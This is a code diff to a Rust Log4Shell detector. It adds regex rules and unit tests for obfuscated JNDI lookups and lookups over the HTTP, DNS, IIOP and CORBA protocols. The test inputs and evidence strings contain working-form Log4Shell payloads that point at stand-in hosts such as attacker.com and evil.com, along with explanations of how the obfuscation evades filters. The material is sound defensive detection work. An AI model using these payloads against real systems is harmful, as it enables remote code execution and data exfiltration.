@@ -504,6 +504,94 @@ impl L2Evaluator for Log4ShellEvaluator {
             });
         }
 
+        static JNDI_UPPER_OBFUSCATION_RE: std::sync::LazyLock<Regex> =
+            std::sync::LazyLock::new(|| {
+                Regex::new(
+                    r"(?is)\$\{(?:[^}]*\$\{(?:upper|lower|:-|::\w+)\s*:[jJnNdDiI][^}]*\}){2,}",
+                )
+                .unwrap()
+            });
+        if let Some(m) = JNDI_UPPER_OBFUSCATION_RE.find(&decoded) {
+            dets.push(L2Detection {
+                detection_type: "jndi_upper_obfuscation".into(),
+                confidence: 0.96,
+                detail: format!("JNDI lookup reconstructed via upper/lower/default segments: {}", m.as_str()),
+                position: m.start(),
+                evidence: vec![ProofEvidence {
+                    operation: EvidenceOperation::SyntaxRepair,
+                    matched_input: m.as_str().to_owned(),
+                    interpretation: "${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://} uses Lookups to reconstruct \"jndi\" character by character. Each character is expanded separately, bypassing simple \"jndi\" string matching.".into(),
+                    offset: m.start(),
+                    property: "Log4j Lookups must be disabled globally via log4j2.formatMsgNoLookups=true. Input sanitization must strip all ${...} sequences before passing to logging.".into(),
+                }],
+            });
+        }
+
+        static JNDI_HTTP_PROTOCOL_RE: std::sync::LazyLock<Regex> =
+            std::sync::LazyLock::new(|| {
+                Regex::new(
+                    r"(?is)\$\{[^}]{0,80}jndi\s*:\s*(?:https?|ftp|jar|file)s?://[a-z0-9._:\-]+/[^}]*\}",
+                )
+                .unwrap()
+            });
+        if let Some(m) = JNDI_HTTP_PROTOCOL_RE.find(&decoded) {
+            dets.push(L2Detection {
+                detection_type: "jndi_http_protocol".into(),
+                confidence: 0.92,
+                detail: format!("JNDI lookup over HTTP/HTTPS/FTP/JAR/FILE protocol: {}", m.as_str()),
+                position: m.start(),
+                evidence: vec![ProofEvidence {
+                    operation: EvidenceOperation::PayloadInject,
+                    matched_input: m.as_str().to_owned(),
+                    interpretation: "${jndi:http://attacker.com/malicious.class} loads Java classes via HTTP ClassLoader. While LDAP is most common, HTTP JNDI lookups also trigger class loading and RCE.".into(),
+                    offset: m.start(),
+                    property: "All JNDI protocols must be blocked. Use log4j 2.17.1+ which restricts JNDI to whitelisted protocols.".into(),
+                }],
+            });
+        }
+
+        static JNDI_DNS_CALLBACK_IMPROVED_RE: std::sync::LazyLock<Regex> =
+            std::sync::LazyLock::new(|| {
+                Regex::new(r"(?is)\$\{[^}]{0,80}jndi\s*:\s*dns(?:s|://)[^}]{0,100}\}").unwrap()
+            });
+        if let Some(m) = JNDI_DNS_CALLBACK_IMPROVED_RE.find(&decoded) {
+            dets.push(L2Detection {
+                detection_type: "jndi_dns_callback".into(),
+                confidence: 0.91,
+                detail: format!("JNDI DNS-only callback payload: {}", m.as_str()),
+                position: m.start(),
+                evidence: vec![ProofEvidence {
+                    operation: EvidenceOperation::PayloadInject,
+                    matched_input: m.as_str().to_owned(),
+                    interpretation: "${jndi:dns://attacker.com/callback} triggers a DNS lookup without class loading, used for blind detection/exfiltration of sensitive environment variables like AWS credentials.".into(),
+                    offset: m.start(),
+                    property: "DNS JNDI lookups must be blocked even if class loading is disabled. They enable out-of-band data exfiltration.".into(),
+                }],
+            });
+        }
+
+        static JNDI_ALT_PROTOCOLS_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+            Regex::new(
+                r"(?is)\$\{[^}]{0,80}jndi\s*:\s*(?:iiop|corba|nis|nds|java\s*:)\s*://[^}]*\}",
+            )
+            .unwrap()
+        });
+        if let Some(m) = JNDI_ALT_PROTOCOLS_RE.find(&decoded) {
+            dets.push(L2Detection {
+                detection_type: "jndi_alt_protocols".into(),
+                confidence: 0.90,
+                detail: format!("JNDI lookup via alternate protocol family: {}", m.as_str()),
+                position: m.start(),
+                evidence: vec![ProofEvidence {
+                    operation: EvidenceOperation::PayloadInject,
+                    matched_input: m.as_str().to_owned(),
+                    interpretation: "IIOP and CORBA are alternative JNDI protocols that also trigger remote class loading. They may bypass filters that only block ldap/rmi. NIS/NDS are also valid JNDI schemes.".into(),
+                    offset: m.start(),
+                    property: "All JNDI transport protocols must be blocked: ldap, ldaps, rmi, dns, iiop, corba, nis, nds, java:. Only explicit allowlisting of required protocols is safe.".into(),
+                }],
+            });
+        }
+
         dets
     }
 
@@ -524,6 +612,9 @@ impl L2Evaluator for Log4ShellEvaluator {
             | "log4j2_threadcontext_injection"
             | "log4j_mdc_injection"
             | "jndi_encoded_payload"
+            | "jndi_upper_obfuscation"
+            | "jndi_http_protocol"
+            | "jndi_alt_protocols"
             | "jndi_nested_obfuscation"
             | "spring4shell_ognl_injection"
             | "confluence_ognl_injection"
@@ -730,5 +821,39 @@ mod tests {
             dets.iter()
                 .any(|d| d.detection_type == "log4j2_date_format_bypass")
         );
+    }
+
+    #[test]
+    fn test_upper_obfuscation() {
+        let eval = Log4ShellEvaluator;
+        let dets = eval.detect("${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://evil/a}");
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "jndi_upper_obfuscation")
+        );
+    }
+
+    #[test]
+    fn test_http_protocol() {
+        let eval = Log4ShellEvaluator;
+        let dets = eval.detect("${jndi:http://attacker.com/payload.class}");
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "jndi_http_protocol")
+        );
+    }
+
+    #[test]
+    fn test_dns_callback() {
+        let eval = Log4ShellEvaluator;
+        let dets = eval.detect("${jndi:dns://attacker.com/callback}");
+        assert!(dets.iter().any(|d| d.detection_type == "jndi_dns_callback"));
+    }
+
+    #[test]
+    fn test_alt_protocols() {
+        let eval = Log4ShellEvaluator;
+        let dets = eval.detect("${jndi:iiop://evil.com:1099/obj}");
+        assert!(dets.iter().any(|d| d.detection_type == "jndi_alt_protocols"));
     }
 }
